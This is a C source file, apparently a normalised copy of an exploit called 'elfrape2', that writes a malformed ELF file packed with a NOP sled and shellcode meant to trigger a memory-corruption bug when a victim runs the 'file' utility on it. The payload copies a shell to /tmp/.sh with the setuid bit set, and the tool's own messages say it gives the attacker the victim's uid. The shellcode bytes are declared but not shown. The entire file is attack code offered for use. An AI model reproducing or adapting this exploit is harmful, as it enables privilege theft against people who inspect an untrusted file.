#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */
typedef  struct TYPE_2__   TYPE_1__ ;

/* Type definitions */
struct TYPE_2__ {int* e_ident; int e_shoff; int e_ehsize; int e_shentsize; int e_shnum; int /*<<< orphan*/  e_version; int /*<<< orphan*/  e_machine; int /*<<< orphan*/  e_type; } ;
typedef  TYPE_1__ Elf32_Ehdr ;

/* Variables and functions */
 int /*<<< orphan*/  EM_VPP500 ; 
 int /*<<< orphan*/  ET_EXEC ; 
 int /*<<< orphan*/  EV_CURRENT ; 
 int FILESIZE ; 
 int O_CREAT ; 
 int O_TRUNC ; 
 int O_WRONLY ; 
 unsigned char* bsd_code ; 
 int /*<<< orphan*/  FUNC0 (int) ; 
 int /*<<< orphan*/  FUNC1 (int) ; 
 int /*<<< orphan*/  FUNC2 (int /*<<< orphan*/ ,char*,...) ; 
 int /*<<< orphan*/  FUNC3 (unsigned char*) ; 
 int FUNC4 () ; 
 unsigned char* linux_code ; 
 scalar_t__ FUNC5 (int) ; 
 int /*<<< orphan*/  FUNC6 (unsigned char*,unsigned char*,int) ; 
 int /*<<< orphan*/  FUNC7 (unsigned char*,int,int) ; 
 int FUNC8 (char*,int) ; 
 int /*<<< orphan*/  FUNC9 (char*) ; 
 unsigned char* FUNC10 (unsigned char*,char*,unsigned char*,int*) ; 
 int /*<<< orphan*/  stderr ; 
 unsigned char* FUNC11 (char*) ; 
 int FUNC12 (int,unsigned char*,int) ; 

int
FUNC13 (int argc, char *argv[])
{
  unsigned char *final_code, *os_code, *shell, *attackbuff;
  int fd, ix, code_len;
  Elf32_Ehdr *ehdr;
  if (!(attackbuff = (char *) FUNC5 (FILESIZE)))
    {
      FUNC2 (stderr, "malloc error\n");
      FUNC1 (-1);
    }
  ehdr = (Elf32_Ehdr *) attackbuff;
  if (argc < 3)
    {
      FUNC2 (stderr, "Usage: %s <filename> <bsd|linux>\n", argv[0]);
      FUNC1 (-1);
    }
  switch (argv[2][0])
    {
    case 'l':
    case 'L':
      os_code = linux_code;
      if (!(shell = FUNC11 ("ash")))
{
  FUNC2 (stderr, "strdup error\n");
  FUNC1 (-1);
}
      break;
    case 'b':
    case 'B':
      os_code = bsd_code;
      if (!(shell = FUNC11 ("tcsh")))/* does tcsh drop privs tho? ah well */
{
  FUNC2 (stderr, "strdup error\n");
  FUNC1 (-1);
}
      break;
    default:
      FUNC2 (stderr, "Invalid target os\n");
      FUNC1 (-1);
    }
  FUNC2 (stderr,
   "elfrape2, using cp /bin/%s /tmp/.sh;chmod 4755 /tmp/.sh shellcode\n",
   shell);
  final_code = FUNC10 (os_code, argv[1], shell, &code_len);
  FUNC2 (stderr, "Using %s shellcode, %d bytes for file %s\n",
   argv[2][0] == 'b' ? "BSD" : "LINUX", code_len, argv[1]);
  FUNC7 (attackbuff, 0x90, FILESIZE);
  FUNC7 (attackbuff, 0x0, sizeof (Elf32_Ehdr));
  FUNC6 (attackbuff + FILESIZE - code_len, final_code, code_len);
  /* file requires the following shit */
  ehdr->e_ident[0] = 0x7f; /* elf magic shit */
  ehdr->e_ident[1] = 'E';
  ehdr->e_ident[2] = 'L';
  ehdr->e_ident[3] = 'F';
  ehdr->e_ident[4] = 0x01;/* 32 bit objects */
  ehdr->e_ident[5] = 0x01;/* LSB */
  ehdr->e_type = ET_EXEC;/* if you wanna know, go google it */
  ehdr->e_machine = EM_VPP500;
  ehdr->e_version = EV_CURRENT;
  ehdr->e_shoff = sizeof (Elf32_Ehdr);
  ehdr->e_ehsize = sizeof (Elf32_Ehdr);
  ehdr->e_shentsize = 2048;
  ehdr->e_shnum = 0x0001;
  for (ix = 0; ix < 256; ix += 4)
    {
      *(long *) (attackbuff + ehdr->e_ehsize + ix) = FUNC4 () - 1500;
    }
  if ((fd = FUNC8 (argv[1], O_WRONLY | O_CREAT | O_TRUNC)) < 0)
    {
      FUNC9 ("open()");
      FUNC1 (-1);
    }
  if (FUNC12 (fd, attackbuff, FILESIZE) == -1)
    {
      FUNC9 ("write()");
      FUNC1 (-1);
    }
  FUNC0 (fd);
  FUNC3 (shell);
  FUNC3 (final_code);
  FUNC2 (stderr,
   "Use /tmp/.sh to gain the targets uid once they run 'file %s'\n",
   argv[1]);
  FUNC2 (stderr, "Make sure the shell you copied doesn't drop privs\n");
  return 0;
}